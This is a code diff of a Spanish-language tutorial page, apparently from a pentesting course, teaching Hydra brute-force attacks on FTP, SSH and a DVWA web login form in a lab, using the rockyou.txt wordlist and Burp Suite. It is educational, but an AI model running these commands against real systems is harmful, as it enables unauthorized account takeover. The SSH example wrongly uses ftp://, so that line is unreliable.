@@ -7,6 +7,11 @@ import Img from "../../../Img";
 import Img_One from "./../../../../sources/imgs/HYDRA/HYDRA_01.png";
 import Img_Two from "./../../../../sources/imgs/HYDRA/HYDRA_03.png";
 import Img_Three from "./../../../../sources/imgs/HYDRA/HYDRA_02.png";
+import Img_Four from "./../../../../sources/imgs/HYDRA/HYDRA_06.png";
+import Img_Five from "./../../../../sources/imgs/HYDRA/HYDRA_04.png";
+import Img_Six from "./../../../../sources/imgs/HYDRA/HYDRA_05.png";
+import Img_Seven from "./../../../../sources/imgs/HYDRA/HYDRA_07.png";
+import Img_Eight from "./../../../../sources/imgs/HYDRA/HYDRA_08.png";
 
 
 
@@ -136,6 +141,68 @@ export default function HYDRA (props) {
                 title = {"Descripcción de imagen."}
                 text = {"3. Comando de versión de Hydra."}
             />
+            
+            <h3 className="span-blue">
+                <img className="icon-subtitle" src={icon_directory} alt=""/>
+                <span className="span-blue">Diccionarios.<span className="span-blue cursor">_</span>
+                </span>
+            </h3>
+
+            <p>
+                <span className="span-yellow">Kali Linux</span> contiene un <span className="span-white">directorio</span> donde contiene <span className="span-pink">diccionarios</span> y <span className="span-pink">listas de palabras</span> en formato <span className="span-white">.txt</span>, para utilizar cuando se necesite:
+            </p>
+
+            <Comand
+                funcionNotificacion = {props.funcionNotificacion}
+                notifications = {props.notifications}
+                code = "cd /usr/share/wordlists/"
+            />
+
+            <p>
+                Entre ellos, se <span className="span-pink">encuentra</span> el archivo <span className="span-white">rockyou.txt</span>, uno de los <span className="span-pink">diccionarios</span> más <span className="span-white">famosos</span> y <span className="span-white">utilizados</span>.
+            </p>
+
+            <Img
+                img = {Img_Five}
+                alt = {"Imagen 4. Diccionarios y listas de palabras."}
+                title = {"Descripcción de imagen."}
+                text = {"4. Diccionarios y listas de palabras."}
+            />
+
+            <p>
+                <span className="span-yellow">Nota:</span> Podemos <span className="span-pink">crear nuestros propios diccionarios</span>, creando un <span className="span-white">archivo nuevo</span> y <span className="span-white">colocando las palabras</span>.
+            </p>
+
+            <p>
+                Tambien podemos <span className="span-white">buscar alguna palabra</span> dentro de un <span className="span white">diccionario</span>, con ayuda del <span className="span-white">comando</span>:
+            </p>
+            
+            <Comand
+                funcionNotificacion = {props.funcionNotificacion}
+                notifications = {props.notifications}
+                code = "cat <diccionario> | grep <palabra>"
+            />
+
+            <p>
+                Como <span className="span-white">ejemplo</span>:
+            </p>
+            
+            <Comand
+                funcionNotificacion = {props.funcionNotificacion}
+                notifications = {props.notifications}
+                code = "cat rockyou.txt | grep admin"
+            />
+
+            <p>
+                De la siguiente manera:
+            </p>
+
+            <Img
+                img = {Img_Six}
+                alt = {"Imagen 5. Busqueda de palabras en listas y diccionarios"}
+                title = {"Descripcción de imagen."}
+                text = {"5. Busqueda de palabras en listas y diccionarios."}
+            />
 
             <h3 className="span-blue">
                 <img className="icon-subtitle" src={icon_directory} alt=""/>
@@ -220,7 +287,7 @@ export default function HYDRA (props) {
             <Comand
                 funcionNotificacion = {props.funcionNotificacion}
                 notifications = {props.notifications}
-                code = "hydra -l <usuario> -P <diccionario> ftp://<objetivo>"
+                code = "hydra -l <usuario> -P <diccionario> -s <puerto> ftp://<objetivo>"
             />
 
             <p>
@@ -230,7 +297,7 @@ export default function HYDRA (props) {
             <Comand
                 funcionNotificacion = {props.funcionNotificacion}
                 notifications = {props.notifications}
-                code = "hydra -l admin -P rockyou.txt ftp://192.168.0.105"
+                code = "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://192.168.0.105"
             />
 
             <p>
@@ -240,13 +307,19 @@ export default function HYDRA (props) {
             <ul className="ol-code">
                 <li>
                     <p>
-                        <span className="span-white">-l admin</span> <span className="span-blue">-></span> <span className="span-pink">Intentará autenticarse con el usuario <span className="span-white">admin</span>.</span>
+                        <span className="span-white">-l msfadmin</span> <span className="span-blue">-></span> <span className="span-pink">Intentará autenticarse con el usuario <span className="span-white">admin</span>.</span>
                     </p>
                 </li>
 
                 <li>
                     <p>
-                        <span className="span-white">-P rockyou.txt</span> <span className="span-blue">-></span> <span className="span-pink">Utilizará una <span className="span-white">lista de contraseñas</span>.</span>
+                        <span className="span-white">-P /usr/share/wordlists/rockyou.txt</span> <span className="span-blue">-></span> <span className="span-pink">Utilizará una <span className="span-white">lista de contraseñas</span> (con su ruta).</span>
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">-s 21</span> <span className="span-blue">-></span> <span className="span-pink">Ataque a servicio corriendo en puerto: <span className="span-white">21</span></span>.
                     </p>
                 </li>
 
@@ -257,6 +330,15 @@ export default function HYDRA (props) {
                 </li>
             </ul>
 
+            <p>Realizandose:</p>
+
+            <Img
+                img = {Img_Seven}
+                alt = {"Imagen 6. Busqueda de palabras en listas y diccionarios"}
+                title = {"Descripcción de imagen."}
+                text = {"6. Ataque FTP."}
+            />
+
             <p>
                 <b className="span-blue">2. Ataques SSH:</b>
             </p>
@@ -266,7 +348,7 @@ export default function HYDRA (props) {
             <Comand
                 funcionNotificacion = {props.funcionNotificacion}
                 notifications = {props.notifications}
-                code = "hydra -L <diccionario> -P <diccionario> ssh://<objetivo>"
+                code = "hydra -L <diccionario> -P <diccionario> -s <puerto> ssh://<objetivo>"
             />
 
             <p>
@@ -276,7 +358,7 @@ export default function HYDRA (props) {
             <Comand
                 funcionNotificacion = {props.funcionNotificacion}
                 notifications = {props.notifications}
-                code = "hydra -L usuarios.txt -P claves.txt ftp://192.168.0.105"
+                code = "hydra -L usuarios.txt -P claves.txt -s 22 ftp://192.168.0.105"
             />
 
             <p>
@@ -298,6 +380,12 @@ export default function HYDRA (props) {
 
                 <li>
                     <p>
+                        <span className="span-white">-s 22</span> <span className="span-blue">-></span> <span className="span-pink">Ataque a servicio corriendo en puerto: <span className="span-white">22</span></span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
                         <span className="span-white">ssh://192.168.0.105</span> <span className="span-blue">-></span> <span className="span-pink">Dirección IP del <span className="span-white">servidor</span> y ataque de servicio <span className="span-white">SSH</span></span>.
                     </p>
                 </li>
@@ -314,17 +402,72 @@ export default function HYDRA (props) {
             <Comand
                 funcionNotificacion = {props.funcionNotificacion}
                 notifications = {props.notifications}
-                code={`hydra -l usuario -P <diccionario> -s <puerto> <protocolo>://<objetivo>/<ruta-pagina>:\\"<consulta>":\\"<texto-error>`}
+                code={`hydra -l <usuario> -P <diccionario> -s <puerto> <protocolo>://<objetivo><direccion-pagina-web>:'<consulta>':'<texto-error>'`}
             />
 
             <p>
-                <span className="span-white">Ejemplo:</span>
+                Para este tipo de <span className="span-pink">ataques HTTP</span>, necesitaremos la ayuda de la herramienta <span className="span-white">Burp Suite</span>, para capturar <span className="span-pink">peticiones HTTP</span> del navegador.
+            </p>
+
+            <p>
+                Como el <span className="span-white">siguiente ejemplo</span>:
+            </p>
+
+            <Img
+                img = {Img_Four}
+                alt = {"Imagen 7. Captura de petición con Burp Suite."}
+                title = {"Descripcción de imagen."}
+                text = {"7. Captura de petición con Burp Suite."}
+            />
+
+            <p>Donde podemos obtener los siguientes <span className="span-white">datos utiles</span>:</p>
+
+            <ul className="ol-code">
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Puerto&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Basandonos del escaneo de objetivo, obtenemos este dato</span>. En nuestro caso es: <span className="span-white">80</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Protocolo&gt;</span> <span className="span-blue">-></span> <span className="span-pink">El método es: POST</span> Debido a eso, colocamos: <span className="span-white">http-post-form</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Objetivo&gt;</span> <span className="span-blue">-></span> <span className="span-pink">La IP del objetivo es: </span><span className="span-white">192.168.0.105</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Direccion-pagina-web&gt;</span> <span className="span-blue">-></span> <span className="span-pink">La dirección de la pagina web, donde es encuentra el formulario es: </span><span className="span-white">/dvwa/login.php</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Consulta&gt;</span> <span className="span-blue">-></span> <span className="span-pink">La consulta dentro de la petición es: username=canario&password=canario&Login=Login</span>. De esta manera, colocamos <span className="span-white">username=^USER^&password=^PASS^&Login=Login</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">&lt;Texto-error&gt;</span> <span className="span-blue">-></span> <span className="span-pink">El texto de error que aparece en el form es: </span><span className="span-white">Login failed</span>.
+                    </p>
+                </li>
+            </ul>
+
+            <p>
+                <span className="span-white">Quedando el comando final:</span>
             </p>
 
             <Comand
                 funcionNotificacion={props.funcionNotificacion}
                 notifications={props.notifications}
-                code={`hydra -l admin -P rockyou.txt -s 8080 http-post-form://192.168.0.105/<dvwa/login.php>:\\"username=^USER^&password=^PASS^&Login=Login\\":\\"Login failed\\"`}
+                code={`hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 http-post-form://192.168.0.105/dvwa/login.php:'username=^USER^&password=^PASS^&Login=Login':'Login failed'`}
              />
 
 
@@ -335,10 +478,55 @@ export default function HYDRA (props) {
             <ul className="ol-code">
                 <li>
                     <p>
-                        <span className="span-white">-l admin</span> <span className="span-blue">-></span> <span className="span-pink">Utilizará como contraseña <span className="span-white">admin</span></span>.
+                        <span className="span-white">-l admin</span> <span className="span-blue">-></span> <span className="span-pink">Utilizará como usuario <span className="span-white">admin</span></span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">-P /usr/share/wordlists/rockyou.txt</span> <span className="span-blue">-></span> <span className="span-pink">Utilizará el diccionario <span className="span-white">rockyou.txt</span>, ubicado en <span className="span-white">/usr/share/wordlists/rockyou.txt</span> como lista de <span className="span-white">contraseñas</span></span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">-s 80</span> <span className="span-blue">-></span> <span className="span-pink">Realizará el ataque buscando en el puerto <span className="span-white">80</span></span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">http-post-form</span> <span className="span-blue">-></span> <span className="span-pink">Indica que la petición se realiza en método <span className="span-white">POST</span></span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">//192.168.0.105/dvwa/login.php</span> <span className="span-blue">-></span> <span className="span-pink">Indica la dirección del formulario al cual atacar</span>.
+                    </p>
+                </li>
+
+                <li>
+                    <p>
+                        <span className="span-white">'username=^USER^&password=^PASS^&Login=Login':'Login failed'</span> <span className="span-blue">-></span> <span className="span-pink">Indica los parametros y variables necesarios</span>.
                     </p>
                 </li>
             </ul>
+
+            <p>
+                Realizando el ataque:
+            </p>
+
+            <Img
+                img = {Img_Eight}
+                alt = {"Imagen 8. Obtención de credenciales de formulario con Hydra."}
+                title = {"Descripcción de imagen."}
+                text = {"8. Obtención de credenciales de formulario con Hydra."}
+            />
+
+            <p>
+                <span className="span-yellow">Nota:</span> Donde obtenemos que la contreña encontrada es <span className="span-white">password</span>.
+            </p>
         </>
     );
 }
